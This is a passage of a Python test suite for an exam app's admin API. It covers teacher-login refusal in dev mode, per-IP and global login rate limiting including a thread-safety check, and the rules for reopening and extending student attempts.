        resp = client.post("/admin/login", json={"password": DEV_TEACHER_PASSWORD})
    assert resp.status_code == 503 and "TEACHER_PASSWORD" in resp.json()["detail"]
    assert any("REFUSED" in r.message and "ENVIRONMENT=dev" in r.message for r in caplog.records)


# -- login limiter: per IP + global, atomic, no leaked keys --------------------- #
def _wrong() -> bool:
    return False


def _right() -> bool:
    return True


def test_login_limiter_defaults_are_lenient_per_ip_and_bounded_globally(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for var in ("LOGIN_MAX_FAILURES", "LOGIN_GLOBAL_MAX_FAILURES", "LOGIN_WINDOW_SECONDS"):
        monkeypatch.delenv(var, raising=False)
    cfg = Settings(_env_file=None)
    assert (cfg.login_max_failures, cfg.login_global_max_failures) == (10, 30)
    assert cfg.login_window_seconds == 300
    # The live limiter is built from the settings (both limits).
    lim = admin_api.login_limiter
    assert lim.max_failures == admin_api.settings.login_max_failures
    assert lim.global_max_failures == (admin_api.settings.login_global_max_failures or None)


def test_rate_limiter_locks_a_key_without_checking_the_password() -> None:
    lim = LoginRateLimiter(max_failures=2, window_seconds=60, global_max_failures=10)
    checks: list[int] = []

    def right() -> bool:
        checks.append(1)
        return True

    assert lim.attempt("a", _wrong, now=0).failures == 1
    assert lim.attempt("a", right, now=1).ok  # a good login clears the key...
    assert lim.attempt("a", _wrong, now=2).failures == 1  # ...so the count restarted
    second = lim.attempt("a", _wrong, now=3)
    assert (second.failures, second.global_failures, second.retry_after) == (2, 3, 0)

    checks.clear()
    locked = lim.attempt("a", right, now=4)
    assert not locked.ok and locked.scope == "ip" and locked.retry_after == 59
    assert checks == []  # locked out: the password is not even compared
    assert lim.attempt("b", right, now=4).ok  # another client is unaffected
    assert lim.attempt("a", right, now=62).ok  # the t=2 failure aged out


def test_rate_limiter_global_cap_spans_keys() -> None:
    lim = LoginRateLimiter(max_failures=3, window_seconds=60, global_max_failures=5)
    for i in range(5):  # five different IPs, one guess each: no per-IP lock anywhere
        decision = lim.attempt(f"ip{i}", _wrong, now=i)
        assert (decision.failures, decision.retry_after) == (1, 0)
    # A sixth, brand-new IP is refused — even with the right password.
    locked = lim.attempt("fresh", _right, now=10)
    assert not locked.ok and locked.scope == "global" and locked.retry_after == 51
    assert lim.retry_after("fresh", now=10) == 51
    assert lim.attempt("fresh", _right, now=60).ok  # the t=0 failure left the window
    # A good login clears its own key only — never the global count.
    assert lim.attempt("ip4", _right, now=60).ok
    assert lim.attempt("other", _wrong, now=60).global_failures == 5
    assert lim.attempt("fresh", _right, now=60).scope == "global"
    # Without a global limit only the per-key one applies.
    solo = LoginRateLimiter(max_failures=1, window_seconds=60)
    for i in range(20):
        assert solo.attempt(f"ip{i}", _wrong, now=0).retry_after == 0
    assert solo.attempt("ip0", _right, now=1).scope == "ip"
    assert solo.attempt("new", _right, now=1).ok


def test_rate_limiter_drops_keys_with_no_failures_left() -> None:
    lim = LoginRateLimiter(max_failures=3, window_seconds=60)
    assert lim.retry_after("reader", now=0) == 0
    assert lim.attempt("good", _right, now=0).ok
    assert lim.tracked_keys() == 0  # neither a read nor a good login creates a key
    for i in range(50):
        lim.attempt(f"ip{i}", _wrong, now=0)
    assert lim.tracked_keys() == 50
    # Any later call sweeps every key whose failures aged out — nothing accumulates.
    assert lim.retry_after("someone-else", now=61) == 0
    assert lim.tracked_keys() == 0
    lim.record_failure("x", now=70)
    lim.reset("x")
    assert lim.tracked_keys() == 0


def test_rate_limiter_check_and_record_is_atomic() -> None:
    """40 parallel wrong guesses: exactly `max_failures` passwords get checked."""
    lim = LoginRateLimiter(max_failures=5, window_seconds=300, global_max_failures=100)
    workers = 40
    barrier = threading.Barrier(workers)
    checked: list[int] = []
    decisions = []

    def verify() -> bool:
        checked.append(1)
        time.sleep(0.002)  # widen the check-then-record window a racy limiter would lose
        return False

    def guess() -> None:
        barrier.wait()
        decisions.append(lim.attempt("ip", verify))

    threads = [threading.Thread(target=guess) for _ in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert len(checked) == 5
    assert sum(1 for d in decisions if d.retry_after) == workers - 5
    assert lim.tracked_keys() == 1


def test_login_global_limit_over_http_spans_client_ips(
    client: TestClient, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    # Real credentials on both settings: remote clients may reach the login at all.
    monkeypatch.setattr(admin_api.settings, "admin_token_secret", "a-real-secret")
    monkeypatch.setattr(
        admin_api,
        "login_limiter",
        LoginRateLimiter(max_failures=3, window_seconds=300, global_max_failures=4),
    )
    with caplog.at_level(logging.WARNING):
        for n in range(4):
            guesser = TestClient(app, client=(f"198.51.100.{n + 1}", 40000))
            assert guesser.post("/admin/login", json={"password": "wrong"}).status_code == 401
        locked = TestClient(app, client=("198.51.100.99", 40000)).post(
            "/admin/login", json={"password": PASSWORD}
        )
    assert locked.status_code == 429 and int(locked.headers["Retry-After"]) > 0
    assert "Слишком много" in locked.json()["detail"]
    assert any("rate-limited" in r.message and "scope=global" in r.message for r in caplog.records)
    # The teacher who signed in earlier is not affected by the lock (token, not login).
    admin_api.login_limiter.reset()
    headers = _headers(client)
    for n in range(4):
        TestClient(app, client=(f"198.51.100.{n + 1}", 40000)).post(
            "/admin/login", json={"password": "wrong"}
        )
    assert client.get("/admin/tests", headers=headers).status_code == 200


# -- reopen: only a finished attempt ------------------------------------------- #
def test_reopen_refuses_an_attempt_still_being_written(
    client: TestClient, session: Session, tmp_path, caplog: pytest.LogCaptureFixture
) -> None:
    headers = _headers(client)
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    future = datetime.now(UTC) + timedelta(hours=1)
    aid = _seed(session, name="Busy", status="in_progress", deadline=future)

    with caplog.at_level(logging.INFO):
        with pytest.raises(AdminStateError, match="ещё пишет"):
            svc.reopen_attempt("t1-Busy")
        with pytest.raises(AdminStateError):
            svc.reopen_attempt("t1-Busy", extend_minutes=90)
        resp = client.post(
            "/admin/roster/t1-Busy/reopen", json={"extend_minutes": 90}, headers=headers
        )
    assert resp.status_code == 409 and "ещё пишет" in resp.json()["detail"]
    # Nothing moved, and nothing was logged as a reopen / an extension.
    attempt = AttemptRepository(session).get_attempt(aid)
    assert attempt.status == "in_progress" and attempt.deadline == future
    messages = [r.message for r in caplog.records]
    assert not any("TEACHER EXTENDED" in m or "progress kept" in m for m in messages)
    assert any(
        r.levelno == logging.WARNING and "reopen_attempt REFUSED" in r.message
        for r in caplog.records
    )


def test_reopen_accepts_an_overdue_attempt_not_yet_flipped_to_expired(
    session: Session, tmp_path
) -> None:
    """`in_progress` in the DB but past its deadline (lazy expiry has not run): the
    roster already shows it as run out, so the teacher can reopen + extend it."""
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    aid = _seed(session, name="Stale", status="in_progress")  # deadline T0 + 1h: long past
    now = datetime.now(UTC)
    row = svc.reopen_attempt("t1-Stale", extend_minutes=10, now=now)
    session.commit()
    assert row.status == "in_progress" and row.deadline == now + timedelta(minutes=10)
    assert AttemptRepository(session).get_attempt(aid).deadline == now + timedelta(minutes=10)


# -- extension: deadline == max(old, now + N), the teacher's value is never capped -- #
@pytest.mark.parametrize(
    ("old_offset_min", "extend", "expected_offset_min"),
    [
        (-120, 15, 15),  # old deadline long past -> now + N
        (5, 15, 15),  # old deadline sooner than now + N -> now + N
        (15, 15, 15),  # equal
        (40, 15, 40),  # old deadline later -> kept (never shortened)
        (-1, 24 * 60, 24 * 60),  # the API maximum: not capped by any exam window
    ],
)
def test_reopen_extension_deadline_is_exactly_max_of_old_and_now_plus_n(
    session: Session, tmp_path, old_offset_min: int, extend: int, expected_offset_min: int
) -> None:
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    now = datetime(2026, 6, 21, 15, 0, 0, tzinfo=UTC)
    old = now + timedelta(minutes=old_offset_min)
    aid = _seed(session, name="Ext", deadline=old)  # submitted

    row = svc.reopen_attempt("t1-Ext", extend_minutes=extend, now=now)
    session.commit()
    expected = max(old, now + timedelta(minutes=extend))
    assert expected == now + timedelta(minutes=expected_offset_min)
    assert row.deadline == expected
    stored = AttemptRepository(session).get_attempt(aid)
    assert stored.deadline == expected and stored.status == "in_progress"
    assert stored.submitted_at is None
